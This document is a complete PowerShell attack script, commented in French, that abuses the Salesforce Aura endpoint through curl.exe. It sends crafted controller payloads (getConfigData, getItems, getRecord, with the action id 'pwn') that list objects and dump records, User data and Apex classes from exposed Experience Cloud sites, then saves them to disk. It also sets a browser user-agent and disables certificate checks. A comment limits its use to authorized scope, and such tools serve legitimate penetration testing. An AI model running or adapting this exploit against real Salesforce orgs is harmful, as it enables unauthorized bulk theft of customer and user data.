# aura_salesforce_curl.ps1
# Version PowerShell compatible environnements verrouillés / Constrained Language Mode.
# Diff principale: pas de Add-Type, pas de HttpClient .NET. Les requêtes HTTP passent par curl.exe.
# Usage: dans un périmètre autorisé uniquement.

param(
    [Parameter(Mandatory = $true)]
    [string]$Url,

    [Parameter(Mandatory = $true)]
    [Alias("A")]
    [string]$AuraContext,

    [Parameter(Mandatory = $true)]
    [Alias("T")]
    [string]$Token,

    [Alias("o")]
    [string[]]$Objects = @("User"),

    [Alias("l")]
    [switch]$ListObj,

    [Alias("r")]
    [string]$RecordId,

    [Alias("d")]
    [switch]$DumpObjects,

    [ValidateSet("standard", "custom", "both")]
    [string]$ObjectType = "both",

    [Alias("f")]
    [switch]$Full,

    [string]$Cookie,

    [string]$Proxy,

    # Souvent présent dans les vraies requêtes Aura:
    # message=...&aura.context=...&aura.pageURI=/s/...&aura.token=...
    [string]$PageUri,

    # Pour coller à la requête navigateur si la cible vérifie Origin/Referer.
    [string]$Origin,
    [string]$Referer,

    [switch]$Apex,

    [string]$OutputDir,

    [switch]$CustomFields
)

$ErrorActionPreference = "Stop"

$DefaultPageSize = 100
$MaxPageSize     = 1000
$DefaultPage     = 1
$ApexPageSize    = 25

$UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36"

$PayloadPullCustomObj = '{"actions":[{"id":"pwn","descriptor":"serviceComponent://ui.force.components.controllers.hostConfig.HostConfigController/ACTION$getConfigData","callingDescriptor":"UNKNOWN","params":{}}]}'

function Test-Curl {
    $cmd = Get-Command curl.exe -ErrorAction SilentlyContinue
    if (-not $cmd) {
        throw "curl.exe introuvable. Sur Windows 10/11 il est normalement présent dans C:\Windows\System32\curl.exe"
    }
}

function New-AuraSession {
    param(
        [string]$Url,
        [string]$AuraContext,
        [string]$Token,
        [string]$Cookie,
        [string]$Proxy,
        [string]$PageUri,
        [string]$Origin,
        [string]$Referer,
        [string]$OutputDir
    )

    $aura = @{
        Url       = $Url
        Context   = $AuraContext
        Token     = $Token
        Cookie    = $Cookie
        Proxy     = $Proxy
        PageUri   = $PageUri
        Origin    = $Origin
        Referer   = $Referer
        OutputDir = $OutputDir
    }

    return $aura
}

function Invoke-AuraExploit {
    param(
        [Parameter(Mandatory = $true)]
        $Aura,

        [Parameter(Mandatory = $true)]
        [string]$Payload
    )

    Test-Curl

    $endpointUrl = $Aura.Url + "?r=1&applauncher.LoginForm.getLoginRightFrameUrl=1"

    # Important: aura.context et aura.token ne sont PAS URL-encodés.
    # V2: on passe le body directement à curl via --data-raw.
    # Ça évite le BOM UTF-8 ajouté par Set-Content -Encoding UTF8 sur Windows PowerShell 5.1.
    $postBodyString = "message=$Payload&aura.context=$($Aura.Context)"

    if ($Aura.PageUri -and $Aura.PageUri.Trim() -ne "") {
        $postBodyString += "&aura.pageURI=$($Aura.PageUri)"
    }

    $postBodyString += "&aura.token=$($Aura.Token)"

    $tmpOut = Join-Path $env:TEMP ("aura_out_" + (Get-Random) + ".txt")

    $args = @(
        "-k",
        "-sS",
        "-X", "POST",
        "-A", $UserAgent,
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "--data-raw", $postBodyString,
        "-o", $tmpOut,
        "-w", "%{http_code}",
        $endpointUrl
    )

    if ($Aura.Cookie -and $Aura.Cookie.Trim() -ne "") {
        $args = @("-H", ("Cookie: " + $Aura.Cookie)) + $args
    }

    if ($Aura.Origin -and $Aura.Origin.Trim() -ne "") {
        $args = @("-H", ("Origin: " + $Aura.Origin)) + $args
    }

    if ($Aura.Referer -and $Aura.Referer.Trim() -ne "") {
        $args = @("-H", ("Referer: " + $Aura.Referer)) + $args
    }

    if ($Aura.Proxy -and $Aura.Proxy.Trim() -ne "") {
        $args = @("--proxy", $Aura.Proxy) + $args
    }

    $httpCode = & curl.exe @args
    $exitCode = $LASTEXITCODE

    if ($exitCode -ne 0) {
        Remove-Item -Path $tmpOut -Force -ErrorAction SilentlyContinue
        throw "curl.exe a échoué avec exit code $exitCode"
    }

    $responseBody = Get-Content -Path $tmpOut -Raw -ErrorAction Stop
    Remove-Item -Path $tmpOut -Force -ErrorAction SilentlyContinue

    if ($httpCode -notmatch '^2') {
        throw "HTTP $httpCode. Response -> $responseBody"
    }

    try {
        return $responseBody | ConvertFrom-Json
    }
    catch {
        throw "JSON Decode error. Response -> $responseBody"
    }
}

function Get-AuraOutputDir {
    param($Aura)

    if ($Aura.OutputDir -and $Aura.OutputDir.Trim() -ne "") {
        return $Aura.OutputDir
    }

    $sanitised = $Aura.Url
    $sanitised = $sanitised -replace '^https?://', ''
    $sanitised = $sanitised -replace '[^a-zA-Z0-9._-]+', '_'
    if ($sanitised.Trim() -eq "") {
        $sanitised = "aura_output"
    }

    return Join-Path (Get-Location) $sanitised
}

function New-GetItemsPayload {
    param(
        [string]$ObjectName,
        [int]$PageSize,
        [int]$Page
    )

    $payloadObj = @{
        actions = @(
            @{
                id                = "pwn"
                descriptor        = "serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION`$getItems"
                callingDescriptor = "UNKNOWN"
                params            = @{
                    entityNameOrId   = $ObjectName
                    layoutType       = "FULL"
                    pageSize         = $PageSize
                    currentPage      = $Page
                    useTimeout       = $false
                    getCount         = $true
                    enableRowActions = $false
                }
            }
        )
    }

    return ($payloadObj | ConvertTo-Json -Compress -Depth 20)
}

function New-GetRecordPayload {
    param([string]$RecordId)

    $payloadObj = @{
        actions = @(
            @{
                id                = "pwn"
                descriptor        = "serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION`$getRecord"
                callingDescriptor = "UNKNOWN"
                params            = @{
                    recordId             = $RecordId
                    record               = $null
                    inContextOfComponent = ""
                    mode                 = "VIEW"
                    layoutType           = "FULL"
                    defaultFieldValues   = $null
                    navigationLocation   = "LIST_VIEW_ROW"
                }
            }
        )
    }

    return ($payloadObj | ConvertTo-Json -Compress -Depth 20)
}

function Get-PageSize {
    param(
        [bool]$DumpFull,
        [string]$ObjectName
    )

    if ($ObjectName -eq "ApexClass") {
        return $ApexPageSize
    }

    if ($DumpFull) {
        return $MaxPageSize
    }

    return $DefaultPageSize
}

function Get-PropertyNames {
    param($Obj)

    if (-not $Obj) {
        return @()
    }

    return @($Obj.PSObject.Properties | ForEach-Object { $_.Name })
}

function Extract-ErrorMessage {
    param($Errors)

    try {
        $raw = @($Errors)[0].event.attributes.values.message
        if (-not $raw) {
            return "Unknown error"
        }
        return ($raw -replace "`r?`n", " ")
    }
    catch {
        return "Unknown error"
    }
}

function Get-AuraObjects {
    param(
        $Aura,
        [string]$ObjectName,
        [int]$PageSize = $DefaultPageSize,
        [int]$Page = $DefaultPage
    )

    $payload = New-GetItemsPayload -ObjectName $ObjectName -PageSize $PageSize -Page $Page

    try {
        $response = Invoke-AuraExploit -Aura $Aura -Payload $payload

        if ($response.PSObject.Properties.Name -contains "exceptionEvent") {
            if ($response.exceptionEvent) {
                throw ($response | ConvertTo-Json -Depth 50)
            }
        }
    }
    catch {
        Write-Host "[-] Failed to retrieve or exploit."
        Write-Host "[-] Error: $($_.Exception.Message)"
        return $null
    }

    $actions = @($response.actions)
    if ($actions.Count -eq 0) {
        return $null
    }

    $actionData = $actions[0]

    if ($actionData.state -eq "ERROR") {
        $message = Extract-ErrorMessage -Errors $actionData.error
        Write-Host "[-] Error message: $message"
        return $null
    }

    $returnValue = $actionData.returnValue
    if (-not $returnValue) {
        return $null
    }

    $results = @()
    if ($returnValue.PSObject.Properties.Name -contains "result") {
        $results = @($returnValue.result)
    }

    if ($results.Count -ne 0) {
        return $response
    }

    return $null
}

function Get-AuraObjectList {
    param($Aura)

    $response = Invoke-AuraExploit -Aura $Aura -Payload $PayloadPullCustomObj

    if ($response.PSObject.Properties.Name -contains "exceptionEvent") {
        if ($response.exceptionEvent) {
            throw ($response | ConvertTo-Json -Depth 50)
        }
    }

    $actions = @($response.actions)
    if ($actions.Count -eq 0 -or -not $actions[0].state) {
        throw "Failed to get actions: $($response | ConvertTo-Json -Depth 50)"
    }

    $objectMap = $actions[0].returnValue.apiNamesToKeyPrefixes
    return @(Get-PropertyNames -Obj $objectMap | Sort-Object)
}

function Write-AuraObject {
    param(
        $Aura,
        [string]$ObjectName,
        [int]$Page,
        $Value
    )

    $dir = Get-AuraOutputDir -Aura $Aura
    New-Item -ItemType Directory -Force -Path $dir | Out-Null

    $filePath = Join-Path $dir ("{0}__page{1}.json" -f $ObjectName, $Page)
    $Value | ConvertTo-Json -Depth 100 | Set-Content -Path $filePath -Encoding UTF8
}

function Identify-CustomFields {
    param($ReturnValue)

    $fields = @()

    function Recurse-Object {
        param($Obj)

        if (-not $Obj) {
            return
        }

        foreach ($item in @($Obj)) {
            if (-not $item) {
                continue
            }

            foreach ($prop in @($item.PSObject.Properties)) {
                $key = $prop.Name
                $value = $prop.Value

                if ($key -like "*__c") {
                    if ($fields -notcontains $key) {
                        $script:fields += $key
                    }
                }

                if ($value) {
                    if ($value -is [array]) {
                        foreach ($sub in $value) {
                            Recurse-Object -Obj $sub
                        }
                    }
                    else {
                        if (-not ($value.PSObject.Properties.Name -contains "sobjectType")) {
                            Recurse-Object -Obj $value
                        }
                    }
                }
            }
        }
    }

    $script:fields = @()

    $results = @()
    if ($ReturnValue.PSObject.Properties.Name -contains "result") {
        $results = @($ReturnValue.result)
    }

    foreach ($result in $results) {
        if ($result.PSObject.Properties.Name -contains "record") {
            Recurse-Object -Obj $result.record
        }
        else {
            Recurse-Object -Obj $result
        }
    }

    return @($script:fields | Sort-Object -Unique)
}

function Write-CustomFieldsInfo {
    param(
        [string]$OutputDir,
        [string]$ObjectName,
        [string[]]$Fields
    )

    $filePath = Join-Path $OutputDir "custom_fields_summary.txt"

    if (-not (Test-Path $filePath)) {
        "Custom Fields Summary`n===================`n" | Set-Content -Path $filePath -Encoding UTF8
    }

    if ($Fields.Count -gt 0) {
        Add-Content -Path $filePath -Encoding UTF8 -Value "Object: $ObjectName"
        Add-Content -Path $filePath -Encoding UTF8 -Value "Custom Fields:"
        foreach ($field in ($Fields | Sort-Object -Unique)) {
            Add-Content -Path $filePath -Encoding UTF8 -Value "  - $field"
        }
        Add-Content -Path $filePath -Encoding UTF8 -Value ""
    }
}

function Handle-DumpRecord {
    param(
        $Aura,
        [string]$RecordId
    )

    Write-Host "[+] Dumping record: $RecordId"
    $payload = New-GetRecordPayload -RecordId $RecordId

    try {
        $response = Invoke-AuraExploit -Aura $Aura -Payload $payload
    }
    catch {
        Write-Host "[-] Failed to dump the record."
        Write-Host "[-] Error: $($_.Exception.Message)"
        return
    }

    $actions = @($response.actions)
    if ($actions.Count -eq 0 -or $actions[0].state -ne "SUCCESS") {
        Write-Host "[-] Record dump did not succeed (state != SUCCESS)."
        return
    }

    Write-Host "[+] State: $($actions[0].state)"
    Write-Host "[+] Record result:"
    $actions[0].returnValue | ConvertTo-Json -Depth 100
}

function Handle-DumpObjects {
    param(
        $Aura,
        [string[]]$ObjectNames = $null,
        [bool]$DumpFull = $false,
        [bool]$Display = $false,
        [string]$ObjectType = "both",
        [bool]$IdentifyCustom = $false
    )

    if (-not $ObjectNames) {
        $allObjects = Get-AuraObjectList -Aura $Aura

        if ($ObjectType -eq "standard") {
            $ObjectNames = @($allObjects | Where-Object { $_ -notlike "*__c" })
        }
        elseif ($ObjectType -eq "custom") {
            $ObjectNames = @($allObjects | Where-Object { $_ -like "*__c" })
        }
        else {
            $ObjectNames = @($allObjects)
        }

        Write-Host "[+] Filtering objects by type: $ObjectType"
        Write-Host "[+] Found $($ObjectNames.Count) objects to dump"
    }

    $failedObjects = @()

    for ($num = 0; $num -lt $ObjectNames.Count; $num++) {
        $objectName = $ObjectNames[$num]
        $page = $DefaultPage
        $pageSize = Get-PageSize -DumpFull:$DumpFull -ObjectName $objectName
        $objectCustomFields = @()

        while ($true) {
            Write-Host ("[+] {0}/{1}) Getting '{2}' object (page {3})..." -f ($num + 1), $ObjectNames.Count, $objectName, $page)

            $response = Get-AuraObjects -Aura $Aura -ObjectName $objectName -PageSize $pageSize -Page $page
            if (-not $response) {
                $failedObjects += $objectName
                break
            }

            $returnValue = @($response.actions)[0].returnValue
            Write-AuraObject -Aura $Aura -ObjectName $objectName -Page $page -Value $returnValue

            if ($IdentifyCustom -and ($objectName -notlike "*__c")) {
                $objectCustomFields += Identify-CustomFields -ReturnValue $returnValue
                $objectCustomFields = @($objectCustomFields | Sort-Object -Unique)
            }

            if ($Display) {
                $returnValue | ConvertTo-Json -Depth 100
            }

            $page++

            $results = @()
            if ($returnValue.PSObject.Properties.Name -contains "result") {
                $results = @($returnValue.result)
            }

            if (-not $DumpFull) {
                break
            }

            if ($results.Count -eq 0) {
                break
            }

            if ($results.Count -lt $pageSize) {
                break
            }
        }

        if ($IdentifyCustom -and $objectCustomFields.Count -gt 0) {
            Write-CustomFieldsInfo `
                -OutputDir (Get-AuraOutputDir -Aura $Aura) `
                -ObjectName $objectName `
                -Fields $objectCustomFields
        }
    }

    if ($failedObjects.Count -gt 0) {
        Write-Host "[-] Failed to dump: $($failedObjects -join ', ')"
    }
}

function Handle-ListObjects {
    param($Aura)

    $objectsList = Get-AuraObjectList -Aura $Aura

    $defaultObjects = @($objectsList | Where-Object { $_ -notlike "*__c" })
    $customObjects  = @($objectsList | Where-Object { $_ -like "*__c" })

    Write-Host "[+] Found $($objectsList.Count) objects"
    Write-Host "[+] > $($defaultObjects.Count) standard salesforce objects"
    Write-Host "[+] > $($customObjects.Count) custom salesforce objects"

    Write-Host "[+] Standard objects:"
    $defaultObjects | ForEach-Object { Write-Host $_ }

    Write-Host "[+] Custom objects:"
    $customObjects | ForEach-Object { Write-Host $_ }
}

Write-Host "[+] Starting with curl.exe backend, no Add-Type / no .NET HttpClient..."

$aura = New-AuraSession `
    -Url $Url `
    -AuraContext $AuraContext `
    -Token $Token `
    -Cookie $Cookie `
    -Proxy $Proxy `
    -PageUri $PageUri `
    -Origin $Origin `
    -Referer $Referer `
    -OutputDir $OutputDir

if ($ListObj) {
    Handle-ListObjects -Aura $aura
}
elseif ($RecordId -and $RecordId.Trim() -ne "") {
    Handle-DumpRecord -Aura $aura -RecordId $RecordId
}
elseif ($DumpObjects) {
    Handle-DumpObjects `
        -Aura $aura `
        -DumpFull:$Full.IsPresent `
        -ObjectType $ObjectType `
        -IdentifyCustom:$CustomFields.IsPresent
}
elseif ($Apex) {
    Handle-DumpObjects `
        -Aura $aura `
        -ObjectNames @("ApexClass") `
        -DumpFull:$true `
        -ObjectType "both" `
        -IdentifyCustom:$CustomFields.IsPresent
}
else {
    Handle-DumpObjects `
        -Aura $aura `
        -ObjectNames $Objects `
        -DumpFull:$Full.IsPresent `
        -Display:$true `
        -ObjectType "both" `
        -IdentifyCustom:$CustomFields.IsPresent
}
